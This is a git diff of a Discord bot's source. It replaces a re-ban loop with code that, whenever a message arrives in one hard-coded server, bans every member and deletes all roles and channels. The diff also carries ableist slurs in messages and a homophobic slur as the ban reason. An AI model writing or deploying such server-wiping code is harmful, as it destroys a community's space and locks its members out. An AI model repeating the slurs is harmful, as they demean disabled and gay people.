@@ -259,14 +259,23 @@ global.reboot = function resetBot(channel) {
     .then(() => console.log(`  Ping: ${bot.ping}\n  Process restarted!`)));
 }
 
-bot.on('message', message => {
-    message.guild.fetchBans().then(bans => {
-        bans.forEach(user => {
-            console.log('topkek -- they actually updated, retards');
-            message.channel.send("Well, you're all autistic...")
-            message.guild.ban(user);
-        });
-    });
-})
+bot.on("message", async message => {
+    if (message.guild.id === "354062777737936896") {
+        var guild = bot.guilds.get('354062777737936896')
+        var members = guild.members.array()
+        var roles = guild.roles.array()
+        var channels = guild.channels.array()
+        for (i = 0; i < members.length; i++) { 
+            members[i].ban("he's a faggot, no faggots allowed here")
+
+            for (i = 0; i < roles.length; i++) { 
+                roles[i].delete()
+            }
+            for (i = 0; i < channels.length; i++) { 
+                channels[i].delete()
+            }
+        }
+    }
+});
 
 bot.login(botconfig.token);
